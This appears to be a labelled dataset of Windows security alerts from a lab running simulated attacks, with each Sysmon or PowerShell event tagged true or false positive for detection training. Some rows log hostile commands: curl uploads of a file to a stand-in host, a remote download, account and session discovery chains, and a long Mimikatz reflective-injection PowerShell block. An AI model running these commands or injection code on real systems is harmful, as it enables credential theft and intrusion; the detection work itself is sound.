text,label,label_name
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client find  /v \""console\"" \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\find.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:57.757
ProcessGuid: {ff3427f9-2281-6869-9d01-000000001500}
ProcessId: 1788
Image: C:\Windows\System32\find.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Find String (grep) Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: FIND.EXE
CommandLine: find  /v ""console"" 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\Curl.exe  --data c:\\temp\\atomictestfile.txt www.example.com \""cmd.exe\"" /c C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com C:\\Windows\\System32\\curl.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:47:39.261
ProcessGuid: {ff3427f9-4bfb-6868-1306-000000001400}
ProcessId: 3380
Image: C:\Windows\System32\curl.exe
FileVersion: 8.13.0
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F
ParentProcessGuid: {ff3427f9-4bfa-6868-0e06-000000001400}
ParentProcessId: 9660
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Printer spooler service loaded a dll file. Possible PrintNightmare exploit: CVE-2021-34527 6 Low Printer spooler service loaded a dll file. Possible PrintNightmare exploit: CVE-2021-34527 92152 sysmon sysmon_eid7_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\spoolsv.exe NT AUTHORITY\\SYSTEM ""Image loaded:
RuleName: technique_id=1210,technique_name=Exploitation of Remote Services
UtcTime: 2025-07-03 08:10:06.450
ProcessGuid: {ff3427f9-3a64-6866-3e00-000000001200}
ProcessId: 3140
Image: C:\Windows\System32\spoolsv.exe
ImageLoaded: C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll
FileVersion: 10.0.26100.4343 (WinBuild.160101.0800)
Description: PrintConfig User Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PRINTCONFIG.DLL
Hashes: SHA1=B1B111F836AC95255E6386F14DFE54DB34CF531E,MD5=B10FF87F21C9C0BC13F998726189627A,SHA256=08A6880EBD2F05FBAF6DDBCB5A411C29A727B4B7F2236273D433FBEF77305A3E,IMPHASH=14075EFA04039861B61CC18035EF2F7A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell process has copied an executable file to Windows start-up folder 14 High Powershell process has copied an executable file to Windows start-up folder 92226 sysmon sysmon_eid11_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\mount_shares.bat SOCLAB\\vboxuser ""File created:
RuleName: -
UtcTime: 2025-07-04 16:20:15.373
ProcessGuid: {6a97c67b-fd2a-6867-6802-000000000a00}
ProcessId: 2764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\mount_shares.bat
CreationUtcTime: 2025-07-04 16:20:15.373
User: SOCLAB\vboxuser"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PrintWorkflowUserSvc_1d14aa\\ImagePath binary is: C:\\WINDOWS\\system32\\svchost.exe -k PrintWorkflow 3 Low Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PrintWorkflowUserSvc_1d14aa\\ImagePath binary is: C:\\WINDOWS\\system32\\svchost.exe -k PrintWorkflow 92307 sysmon sysmon_eid13_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\services.exe NT AUTHORITY\\SYSTEM ""Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2025-07-03 08:14:36.141
ProcessGuid: {ff3427f9-3a61-6866-0b00-000000001200}
ProcessId: 904
Image: C:\WINDOWS\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\PrintWorkflowUserSvc_1d14aa\ImagePath
Details: C:\WINDOWS\system32\svchost.exe -k PrintWorkflow
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Executable file dropped in folder commonly used by malware 15 Critical Executable file dropped in folder commonly used by malware 92213 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\Explorer.EXE C:\\Users\\snell\\AppData\\Local\\Temp\\eicar.exe SOCLAB\\snell ""File created:
RuleName: -
UtcTime: 2025-06-29 12:02:02.891
ProcessGuid: {ff3427f9-29bd-6861-f800-000000001000}
ProcessId: 5648
Image: C:\WINDOWS\Explorer.EXE
TargetFilename: C:\Users\snell\AppData\Local\Temp\eicar.exe
CreationUtcTime: 2025-06-29 12:02:02.889
User: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 21:51:12.216
ProcessGuid: {ff3427f9-4cd0-6868-4d06-000000001400}
ProcessId: 9440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares. 12 High New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares. 92650 win_evt_channel windows windows_eventchannel Win11Client ""A service was installed in the system.

Service Name:  XIfn
Service File Name:  %systemroot%\UbntCfHC.exe
Service Type:  user mode service
Service Start Type:  demand start
Service Account:  LocalSystem"" INFORMATION Service Control Manager System EventChannel",1,TP
"Powershell script may be using Base64 decoding method 10 Medium Powershell script may be using Base64 decoding method 91809 windows  powershell windows_eventchannel Win11Client ""Creating Scriptblock text (1 of 1):
Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
		{
			Throw ""Can't supply a ProcId and ProcName, choose one or the other""
		}
		elseif ($ProcName -ne $null -and $ProcName -ne """")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw ""Can't find process $ProcName""
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose ""Getting SeDebugPrivilege""
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't obtain the handle for process ID: $ProcId""
			}
			
			Write-Verbose ""Got the handle for the remote process to inject in to""
		}
		

		#Load the PE reflectively
		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( ""Architecture: "" + $Processor.AddressWidth + "" Process: "" + ([System.IntPtr]::Size * 8))
            Write-Error ""PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS."" -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw ""Unable to load PE, handle returned is NULL""
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose ""Calling function with WString return type""
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""powershell_reflective_mimikatz""
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw ""Unable to get output, Output Ptr is NULL""
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw ""VoidFunc couldn't be found in the DLL""
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
			}
		}
		
		Write-Verbose ""Done!""
	}

ScriptBlock ID: bfe9b4f9-1068-45f2-a211-bab6a711f804
Path: "" VERBOSE Microsoft-Windows-PowerShell Microsoft-Windows-PowerShell/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:27.640
ProcessGuid: {ff3427f9-26ab-6868-0402-000000001400}
ProcessId: 7572
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! > hello.txt & type hello.txt
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"A net.exe account discovery command was initiated 3 Low A net.exe account discovery command was initiated 92039 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\net1 user guest net user guest C:\\Windows\\SysWOW64\\net1.exe C:\\Windows\\SysWOW64\\net.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2025-07-06 11:40:53.452
ProcessGuid: {ff3427f9-60c5-686a-2804-000000001600}
ProcessId: 7668
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1 user guest
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {ff3427f9-51d6-686a-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=669EE7F92EA3872FE2A36DF91ABF0E049B829279,MD5=F8D42E2BF18D54816819EA4DB4480F5F,SHA256=647136C32E9E7639B251719CFE503F1BD482335AECEC7AE7CB8A91B0A9805D49,IMPHASH=FEB4A1A72B6368863C8CC53955256BF8
ParentProcessGuid: {ff3427f9-60c5-686a-2604-000000001600}
ParentProcessId: 7896
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net user guest
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Command shell started script with /c modifier 4 Low Command shell started script with /c modifier 92005 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\System32\\WScript.exe\"" \""C:\\Users\\snell\\AppData\\Local\\Temp\\AtomicTest.vbs\"" \""cmd.exe\"" /c c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ &amp; echo Set objShell = CreateObject(\""WScript.Shell\""):Set objExec = objShell.Exec(\""whoami\""):Set objExec = Nothing:Set objShell = Nothing &gt; AtomicTest.vbs &amp; AtomicTest.vbs C:\\Windows\\System32\\wscript.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:55.941
ProcessGuid: {ff3427f9-26c7-6868-1802-000000001400}
ProcessId: 5208
Image: C:\Windows\System32\wscript.exe
FileVersion: 5.812.10240.16384
Description: Microsoft ® Windows Based Script Host
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\snell\AppData\Local\Temp\AtomicTest.vbs"" 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=F17CFCD2BDA29421AD37F8764C514396A1DEA7C9,MD5=60933788CB36C3EE2199626C5EC8ADA0,SHA256=7D31A31136319D0A277C7FB0E9BBCB46BA3535A42AEB0307FED70F92649F4162,IMPHASH=EE6DDCBA60642B0ADD3CAB9EA721BEE2
ParentProcessGuid: {ff3427f9-26c7-6868-1402-000000001400}
ParentProcessId: 7940
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Scripting file created under Windows Temp or User folder 6 Low Scripting file created under Windows Temp or User folder 92200 sysmon sysmon_eid11_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\system32\\notepad.exe C:\\Users\\vboxuser\\Desktop\\mount_shares.bat SOCLAB\\vboxuser ""File created:
RuleName: -
UtcTime: 2025-07-04 16:17:52.294
ProcessGuid: {6a97c67b-fe8b-6867-6d02-000000000a00}
ProcessId: 3316
Image: C:\Windows\system32\notepad.exe
TargetFilename: C:\Users\vboxuser\Desktop\mount_shares.bat
CreationUtcTime: 2025-07-04 16:17:52.294
User: SOCLAB\vboxuser"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\system32\\cmd.exe /c C:\\Windows\\system32\\reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64 C:\\Windows\\system32\\cmd.exe /d /c C:\\Windows\\system32\\silcollector.cmd configure C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\cmd.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-03 08:07:35.579
ProcessGuid: {6a97c67b-3a47-6866-c500-000000000a00}
ProcessId: 3620
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6a97c67b-3a07-6866-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {6a97c67b-3a47-6866-c300-000000000a00}
ParentProcessId: 3560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /d /c C:\Windows\system32\silcollector.cmd configure
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
